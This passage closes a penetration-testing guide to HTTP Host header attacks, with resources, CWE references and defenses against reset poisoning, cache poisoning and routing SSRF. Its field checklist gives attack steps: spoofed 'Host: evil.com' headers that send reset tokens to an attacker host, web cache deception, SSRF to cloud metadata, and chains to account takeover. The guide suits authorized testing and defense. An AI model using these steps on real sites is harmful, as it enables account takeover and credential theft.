- **Web Cache Deception** on `/account/x.css`-style paths → read other users' PII/tokens (Omer Gil).
- **Routing-based SSRF** (`Host: 169.254.169.254`/internal) → metadata creds → cloud takeover ("Cracking the lens").
- **X-Original-URL path-override** → reach `/admin` past a front-end ACL.
- **OAuth callback poisoning** via Host → token theft → ATO.

### Q94. Resources to work through.
PortSwigger Academy → **HTTP Host header attacks** and **Web cache poisoning** labs; James Kettle's "Practical Web Cache Poisoning" and "Cracking the lens"; Omer Gil's **Web Cache Deception Attack**; HackTricks *Host header injection* / *Cache poisoning & deception*; PayloadsAllTheThings; Burp Param Miner docs. Read disclosed HackerOne reports tagged "host header / reset poisoning / cache poisoning".

### Q95. CWE / standards to cite.
**CWE-644** (Improper Neutralization of HTTP Headers), **CWE-640** (Weak Password Recovery), **CWE-444/CWE-349** (cache/request-interpretation), **CWE-918** (SSRF), **CWE-79** (XSS via cache), **CWE-200** (WCD data exposure).

---

# DEFENSE — SECURING THE HOST HEADER

### Q96. What's the core secure design?
**Never trust the Host/forwarding headers for security decisions.** Build absolute URLs (reset links, redirects, OAuth callbacks) from a **server-configured canonical domain**, not the request. Validate `Host` against an **allowlist** and reject/normalize unknown values. **Ignore** `X-Forwarded-Host`/`X-Host`/`Forwarded`/`X-Original-URL` unless set by a **trusted** proxy you control.

### Q97. How do I prevent reset-poisoning specifically?
Generate reset links from the canonical domain (config constant), never from `Host`/`X-Forwarded-Host`. Bind the reset token to the user and a server-side domain; don't email a host the request supplied. (Django: set `ALLOWED_HOSTS` correctly and don't use `request.get_host()` for links.)

### Q98. How do I prevent cache poisoning / WCD?
**Poisoning:** include any header that affects the response in the **cache key** (or strip it); add `Vary: X-Forwarded-Host` (etc.) or don't reflect host headers into cacheable responses; normalize cache keys carefully. **WCD:** don't cache by extension blindly — cache only when the response is genuinely cacheable/non-personalized; ensure the origin returns 404 (not the private page) for `/account/x.css`; respect `Cache-Control: private/no-store` on authenticated responses.

### Q99. How do I prevent routing SSRF / path-override?
Don't route to backends based on a **client-supplied** host; map vhosts server-side. Reject/normalize unexpected `Host` values at the edge. Don't let the app re-derive the path from `X-Original-URL`/`X-Rewrite-URL`; enforce ACLs on the **actual** path the app serves. Restrict egress from the web tier (kills metadata reach).

### Q100. One-paragraph summary you can quote.
*"The Host header (and the `X-Forwarded-*` family) is attacker-controlled input — so never use it to build links, key caches, route backends, or make access decisions. Generate absolute URLs from a server-configured canonical domain (this kills password-reset poisoning), validate `Host` against an allowlist and ignore forwarding headers unless they come from a trusted proxy, include any response-affecting header in the cache key (and `Vary`) while never caching authenticated responses by extension (this kills web-cache poisoning and deception), and route/authorize on server-side configuration rather than the client's host or `X-Original-URL` (this kills routing SSRF and path-override). A single trusted header can otherwise become account takeover, mass stored XSS, theft of other users' private pages, or a path into the internal network and cloud."*

---

## APPENDIX — 60-second Host-header field checklist
```
[ ] Recon sinks: reset/verify links · redirects/canonical · cacheable pages (X-Cache/Age) · vhost routing · SSO callbacks
[ ] Baseline: Host: evil.com accepted/reflected? X-Forwarded-Host: evil.com used? where does the host LAND?
[ ] Bypass: X-Forwarded-Host · duplicate Host · absolute URI · line-wrap · suffix/prefix/dot/case · SNI mismatch
[ ] Related headers: X-Forwarded-Scheme/Proto (downgrade) · X-Forwarded-Port · X-Original-URL/X-Rewrite-URL (auth bypass) · XFF (IP-gate)
[ ] Reset poisoning (own acct): forgot-pw + spoofed host → email link to my host + token → ATO (dangling-markup if partial)
[ ] Cache poisoning: reflected + cacheable + UNKEYED (Param Miner, ?cb=) + no Vary → served-from-cache to a clean req
[ ] Web Cache Deception: /account/info/x.css → cached + readable unauth (own acct) → reads victim's private data
[ ] Routing SSRF: Host: 169.254.169.254 / internal / <id>.oast.pro → internal content / OOB → metadata creds (read-only)
[ ] Chain: routing-SSRF/cache-XSS/reset → admin ATO / cloud → RCE ; OAuth callback poisoning → token theft
[ ] FP check: kill bare reflection / accepted-but-unused / fixed-domain reset / unproven cache ; report IMPACT + CWE-644
```
*End of guide.*
